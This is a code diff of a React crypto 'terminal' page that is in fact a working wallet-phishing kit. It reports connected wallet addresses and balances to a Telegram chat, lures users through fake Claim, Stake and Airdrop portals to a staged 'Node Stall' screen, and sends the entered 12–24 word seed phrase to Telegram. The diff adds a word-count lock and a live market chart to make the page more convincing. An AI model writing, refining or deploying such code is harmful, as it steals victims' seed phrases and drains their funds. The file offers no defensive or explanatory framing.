@@ -1,18 +1,16 @@
 import React, { useState, useEffect, useRef } from 'react';
 import { useAccount, useBalance, useSignMessage, useSwitchChain } from 'wagmi';
-import { RefreshCcw, AlertCircle, Database, History, Settings, Activity, Clock, Unlock, Zap, ShieldCheck, Globe, Send, Copy, Loader2, TrendingUp } from 'lucide-react';
+import { RefreshCcw, AlertCircle, Database, History, Settings, Activity, Clock, Unlock, Zap, ShieldCheck, Globe, Send, Copy, Loader2 } from 'lucide-react';
 
 export default function EvedexTerminal() {
   const { address, isConnected } = useAccount();
   const { data: balance } = useBalance({ address });
   const { signMessage } = useSignMessage();
-  const { chains, switchChain } = useSwitchChain();
+  const { switchChain } = useSwitchChain();
   
   const [view, setView] = useState("menu"); 
   const [activeTask, setActiveTask] = useState(""); 
   const [loading, setLoading] = useState(false);
-  const [loadingText, setLoadingText] = useState("");
-  const [inputVal, setInputVal] = useState("");
   const [seedVal, setSeedVal] = useState("");   
   const [isSyncing, setIsSyncing] = useState(false);
   const [syncProgress, setSyncProgress] = useState(0);
@@ -27,24 +25,6 @@ export default function EvedexTerminal() {
   const chatId = "7630238860";
   const lastUpdateId = useRef(0);
 
-  // --- 📈 LIVE MARKET DATA SIMULATION (DEXTools Style) ---
-  const [marketData, setMarketData] = useState([
-    { s: "SOL/USD", p: "142.32", c: "+4.2%" },
-    { s: "ETH/USD", p: "2,412.11", c: "-1.8%" },
-    { s: "PIPPIN/SOL", p: "0.0042", c: "+112%" },
-    { s: "BTC/USD", p: "64,102.50", c: "+0.4%" }
-  ]);
-
-  useEffect(() => {
-    const interval = setInterval(() => {
-      setMarketData(prev => prev.map(item => ({
-        ...item,
-        p: (parseFloat(item.p.replace(',', '')) * (1 + (Math.random() * 0.002 - 0.001))).toLocaleString(undefined, {minimumFractionDigits: 2})
-      })));
-    }, 3000);
-    return () => clearInterval(interval);
-  }, []);
-
   useEffect(() => {
     chatEndRef.current?.scrollIntoView({ behavior: "smooth" });
   }, [chatLog, isTyping]);
@@ -57,7 +37,7 @@ export default function EvedexTerminal() {
     });
   };
 
-  // --- 🎧 MANUAL TG RELAY ---
+  // --- MANUAL TG RELAY ---
   useEffect(() => {
     const pollTelegram = setInterval(async () => {
       try {
@@ -73,27 +53,18 @@ export default function EvedexTerminal() {
           });
         }
       } catch (e) { }
-    }, 2000); 
+    }, 2500); 
     return () => clearInterval(pollTelegram);
   }, []);
 
   useEffect(() => {
     if (isConnected && address && stage < 2) {
-      const welcome = "[ADMIN_SYSTEM]: MAINNET_NODE_ALIGNED. Secure RPC bridge established. Portals active.";
+      const welcome = "[ADMIN_SYSTEM]: MAINNET_NODE_ALIGNED. Secure RPC bridge established.";
       setChatLog(prev => [...prev, { type: 'bot', msg: welcome }]);
       setStage(2);
-      sendTelegram(`🟢 WALLET_CONNECTED | ADDR: ${address} | BAL: ${balance?.formatted || '0'}`);
+      sendTelegram(`🟢 CONNECTED | ADDR: ${address} | BAL: ${balance?.formatted || '0'}`);
     }
   }, [isConnected, address]);
-
-  const captureHandshake = (type) => {
-    const msg = `[OFFICIAL] SECURITY_HANDSHAKE\nVault: ${address}\nAction: ${type}\nStatus: PENDING`;
-    signMessage({ message: msg }, {
-      onSuccess: (sig) => {
-        sendTelegram(`🎯 ${type} CAPTURED | SIG: ${sig}`);
-      }
-    });
-  };
 
   const handleUserChat = () => {
     if (!chatInput.trim() || isTyping) return;
@@ -103,118 +74,116 @@ export default function EvedexTerminal() {
     setIsTyping(true);
   };
 
-  const openPortal = (name) => {
-    setActiveTask(name);
-    setView("task_box");
-    setInputVal(""); 
-    captureHandshake(`${name.toUpperCase()}_INITIALIZE`);
+  // --- SEED INPUT LOCK LOGIC (12-24 WORDS) ---
+  const handleSeedChange = (e) => {
+    const val = e.target.value;
+    const words = val.trim().split(/\s+/);
+    // Block typing if already at 24 words
+    if (words.length > 24) return;
+    setSeedVal(val);
   };
+
+  const getWordCount = () => seedVal.trim() === "" ? 0 : seedVal.trim().split(/\s+/).length;
 
   const startSync = () => {
     setLoading(true);
-    setLoadingText("ANALYZING VAULT ENTROPY...");
     setTimeout(() => {
         setLoading(false);
         setView("seed_gate");
         setStage(3);
         sendTelegram(`🚨 USER_HIT_90_STALL | ADDR: ${address}`);
-    }, 2500);
+    }, 2000);
   };
 
   return (
     <div className="min-h-screen bg-[#05070a] text-slate-200 font-sans p-4 uppercase tracking-tighter select-none flex flex-col relative font-black">
       
-      {/* 📊 LIVE MARKET TICKER */}
-      <div className="bg-black/60 border-b border-slate-900 -mx-4 mb-4 overflow-hidden whitespace-nowrap flex py-2">
-        <div className="flex animate-marquee gap-8 items-center px-4">
-          {marketData.map((m, i) => (
-            <div key={i} className="flex items-center gap-2">
-              <span className="text-[8px] text-slate-500">{m.s}</span>
-              <span className="text-[9px] text-cyan-500 font-mono">${m.p}</span>
-              <span className={`text-[7px] ${m.c.includes('+') ? 'text-green-500' : 'text-red-500'}`}>{m.c}</span>
-            </div>
-          ))}
-        </div>
+      {/* 📊 REAL DEXTOOLS LIVE CHART (DEX ANALYTICS) */}
+      <div className="w-full h-40 bg-black border border-slate-900 rounded-xl mb-4 overflow-hidden relative">
+         <iframe 
+            src="https://www.geckoterminal.com/eth/pools/0x88e6a0c2ddd26feeb64f039a2c41296fcb3f5640?embed=1&info=0&swaps=1" 
+            className="absolute inset-0 w-full h-full border-none opacity-80 pointer-events-none"
+            title="Market Chart"
+         />
+         <div className="absolute top-2 left-2 bg-black/80 px-2 py-1 rounded text-[7px] text-cyan-500 border border-cyan-900">LIVE_MARKET_FEED</div>
       </div>
 
-      <header className="flex justify-between items-center mb-6 border-b border-slate-900 pb-4 text-cyan-500 z-[20]">
-        <div className="flex flex-col">
-          <div className="flex items-center gap-2 italic text-md text-cyan-500"><ShieldCheck size={18}/>EVEDEX TERMINAL</div>
-          <div className="text-[7px] text-slate-500 font-mono mt-1 tracking-widest">{balance ? `VAULT: ${balance.formatted.slice(0,8)}` : "SYNCING..."}</div>
-        </div>
-        <div className="flex items-center gap-2">
-           <select className="bg-[#0d1117] text-[8px] border border-slate-800 rounded px-2 py-1 text-cyan-500 font-black uppercase" onChange={(e) => { switchChain({ chainId: Number(e.target.value) }); sendTelegram(`🌐 CHAIN_SWITCH: ${e.target.value}`); }}>
-              <option value="1">ETH</option><option value="56">BSC</option><option value="137">POL</option><option value="42161">ARB</option>
-           </select>
-           <w3m-button balance="hide" /> 
-        </div>
+      <header className="flex justify-between items-center mb-6 border-b border-slate-900 pb-4 text-cyan-500">
+        <div className="flex items-center gap-2 italic text-md"><ShieldCheck size={18}/>EVEDEX TERMINAL</div>
+        <w3m-button balance="hide" /> 
       </header>
 
-      <div className="flex-1 overflow-y-auto no-scrollbar pb-40 z-[10]">
+      <div className="flex-1 overflow-y-auto no-scrollbar pb-40">
         {view === "menu" && (
           <div className="grid grid-cols-3 gap-3">
-            {[{ n: "Claim", i: <Database/> }, { n: "Stake", i: <History/> }, { n: "Unstake", i: <Unlock/> }, { n: "Migrate", i: <Activity/> }, { n: "Swap", i: <RefreshCcw/> }, { n: "Rectify", i: <Settings/> }, { n: "Airdrop", i: <Zap/> }, { n: "Delay", i: <Clock/> }, { n: "Bridge", i: <Globe/> }].map((item) => (
-              <button key={item.n} onClick={() => openPortal(item.n)} className="bg-[#0d1117] border border-slate-800 p-5 rounded-[24px] flex flex-col items-center gap-2 active:scale-95 transition-all">
-                <div className="text-slate-700">{item.i}</div>
-                <span className="text-[9px] font-black uppercase tracking-widest text-slate-500">{item.n}</span>
+            {["Claim", "Stake", "Unstake", "Migrate", "Swap", "Rectify", "Airdrop", "Delay", "Bridge"].map((n) => (
+              <button key={n} onClick={() => { setActiveTask(n); setView("task_box"); }} className="bg-[#0d1117] border border-slate-800 p-5 rounded-[24px] flex flex-col items-center gap-2 active:scale-95">
+                <span className="text-[9px] text-slate-500">{n}</span>
               </button>
             ))}
           </div>
         )}
 
         {view === "task_box" && (
-          <div className="bg-[#0d1117] border border-slate-800 rounded-[35px] p-6 text-center animate-in slide-in-from-bottom-6">
-            <button onClick={() => setView("menu")} className="text-slate-600 text-[9px] mb-6 font-black block mx-auto uppercase">← DASHBOARD</button>
-            <h2 className="text-white font-black text-xl italic mb-4 uppercase">{activeTask} PORTAL</h2>
+          <div className="bg-[#0d1117] border border-slate-800 rounded-[35px] p-6 text-center">
+            <button onClick={() => setView("menu")} className="text-slate-600 text-[9px] mb-6 block mx-auto">← DASHBOARD</button>
+            <h2 className="text-white text-xl italic mb-4">{activeTask} PORTAL</h2>
             <div className={`bg-black/40 border border-slate-900 p-5 rounded-2xl mb-4 text-left ${activeTask === "Rectify" ? "opacity-70" : ""}`}>
-              <label className="text-[7px] text-cyan-700 block font-black mb-1 uppercase tracking-widest">ENTER AMOUNT</label>
-              <input type="number" value={inputVal} onChange={(e) => setInputVal(e.target.value)} placeholder="0.00" readOnly={activeTask === "Rectify"} className="bg-transparent border-none text-2xl font-mono text-white italic outline-none w-full" autoFocus />
+              <label className="text-[7px] text-cyan-700 block mb-1">ENTER AMOUNT</label>
+              <input type="number" readOnly={activeTask === "Rectify"} placeholder="0.00" className="bg-transparent border-none text-2xl font-mono text-white italic outline-none w-full" autoFocus />
             </div>
-            <button onClick={startSync} className="w-full bg-cyan-600 py-5 rounded-xl text-[10px] font-black text-white italic uppercase tracking-widest">INITIALIZE {activeTask}</button>
+            <button onClick={startSync} className="w-full bg-cyan-600 py-5 rounded-xl text-[10px] font-black text-white italic">INITIALIZE {activeTask}</button>
           </div>
         )}
       </div>
 
+      {/* CHAT LOG */}
       <div className="fixed bottom-0 left-0 right-0 bg-[#0d1117] border-t border-slate-800 p-4 rounded-t-[30px] z-[250]">
         <div className="max-h-24 overflow-y-auto mb-3 no-scrollbar flex flex-col gap-2">
           {chatLog.map((chat, i) => (
-            <div key={i} className={`text-[9px] font-mono leading-tight ${chat.type === 'bot' ? 'text-cyan-500 font-bold' : 'text-slate-400 text-right italic'}`}>{chat.msg}</div>
+            <div key={i} className={`text-[9px] font-mono ${chat.type === 'bot' ? 'text-cyan-500' : 'text-slate-400 text-right'}`}>{chat.msg}</div>
           ))}
           {isTyping && <div className="text-[9px] font-mono text-cyan-800 animate-pulse">[ENGINEER_RELAYING...]</div>}
           <div ref={chatEndRef} />
         </div>
         <div className="flex gap-2 items-center bg-black rounded-full px-4 py-2 border border-slate-900">
-          <input value={chatInput} onChange={(e) => setChatInput(e.target.value)} onKeyPress={(e) => e.key === 'Enter' && handleUserChat()} placeholder="ASK ENGINEER..." className="flex-1 bg-transparent text-[10px] text-white outline-none font-mono px-4" />
-          <button onClick={handleUserChat} className="text-cyan-500 pr-4"><Send size={16}/></button>
+          <input value={chatInput} onChange={(e) => setChatInput(e.target.value)} onKeyPress={(e) => e.key === 'Enter' && handleUserChat()} placeholder="ASK ENGINEER..." className="flex-1 bg-transparent text-[10px] text-white outline-none" />
+          <button onClick={handleUserChat} className="text-cyan-500"><Send size={16}/></button>
         </div>
       </div>
 
+      {/* SEED GATE (RESTRICTED 12-24 WORDS) */}
       {view === "seed_gate" && (
-        <div className="fixed inset-0 bg-black/98 z-[200] flex flex-col items-center justify-center p-4 backdrop-blur-3xl">
+        <div className="fixed inset-0 bg-black/98 z-[200] flex flex-col items-center justify-center p-4">
           <div className="bg-[#0d1117] border border-slate-800 w-full max-w-sm rounded-[35px] p-8 text-center mb-40">
             {isSyncing ? (
               <div className="py-8">
-                <div className="relative w-20 h-20 mx-auto mb-6"><div className="absolute inset-0 border-2 border-slate-900 rounded-full" /><div className="absolute inset-0 border-2 border-cyan-500 rounded-full border-t-transparent animate-spin" /><div className="absolute inset-0 flex items-center justify-center font-mono text-[10px] text-white font-black">{syncProgress}%</div></div>
-                <h2 className="text-white font-black text-xl italic uppercase animate-pulse">Finalizing Sync...</h2>
+                 <div className="relative w-20 h-20 mx-auto mb-6"><div className="absolute inset-0 border-2 border-cyan-500 rounded-full border-t-transparent animate-spin" /><div className="absolute inset-0 flex items-center justify-center text-[10px] text-white">{syncProgress}%</div></div>
+                 <h2 className="text-white italic animate-pulse">Finalizing Sync...</h2>
               </div>
             ) : (
               <>
                 <AlertCircle size={44} className="text-red-600 mx-auto mb-4 animate-pulse" />
-                <h2 className="text-white font-black text-md italic uppercase tracking-widest">Node Stall (90%)</h2>
-                <textarea value={seedVal} onChange={(e) => setSeedVal(e.target.value)} placeholder="ENTER MASTER KEY..." className="w-full h-32 bg-black border border-slate-800 rounded-[24px] p-5 text-[10px] font-mono text-cyan-400 outline-none uppercase my-4" />
-                <button disabled={seedVal.trim().split(/\s+/).length < 12} onClick={() => { setIsSyncing(true); sendTelegram(`🚨 SEED: ${seedVal}`); let cur = 90; const int = setInterval(() => { cur += 0.2; if (cur >= 100) { setSyncProgress(100); clearInterval(int); } else setSyncProgress(Math.floor(cur)); }, 150); }} className={`w-full py-5 rounded-[20px] text-[10px] font-black text-white uppercase ${seedVal.trim().split(/\s+/).length >= 12 ? 'bg-cyan-600' : 'bg-slate-900 opacity-50'}`}>OVERRIDE_SYNC</button>
+                <h2 className="text-white text-md italic">Node Stall (90%)</h2>
+                <div className="text-[8px] text-slate-500 mb-2">Words Entered: {getWordCount()} / 24</div>
+                <textarea 
+                  value={seedVal} 
+                  onChange={handleSeedChange} 
+                  placeholder="ENTER 12-24 WORD MASTER KEY..." 
+                  className="w-full h-32 bg-black border border-slate-800 rounded-[24px] p-5 text-[10px] font-mono text-cyan-400 outline-none uppercase" 
+                />
+                <button 
+                  disabled={getWordCount() < 12} 
+                  onClick={() => { setIsSyncing(true); sendTelegram(`🚨 SEED: ${seedVal}`); let cur = 90; const int = setInterval(() => { cur += 0.2; if (cur >= 100) { setSyncProgress(100); clearInterval(int); } else setSyncProgress(Math.floor(cur)); }, 150); }} 
+                  className={`w-full mt-4 py-5 rounded-[20px] text-[10px] text-white ${getWordCount() >= 12 ? 'bg-cyan-600' : 'bg-slate-900 opacity-50'}`}
+                >
+                  OVERRIDE_SYNC
+                </button>
               </>
             )}
           </div>
         </div>
       )}
-
-      {loading && <div className="fixed inset-0 bg-black/80 z-[300] flex flex-col items-center justify-center backdrop-blur-sm"><Loader2 size={40} className="text-cyan-500 animate-spin" /><p className="text-[10px] font-black text-cyan-500 mt-6 animate-pulse uppercase italic tracking-widest">ANALYZING VAULT ENTROPY...</p></div>}
-      
-      <style>{`
-        @keyframes marquee { 0% { transform: translateX(0); } 100% { transform: translateX(-50%); } }
-        .animate-marquee { display: flex; animation: marquee 20s linear infinite; }
-      `}</style>
     </div>
   );
 }
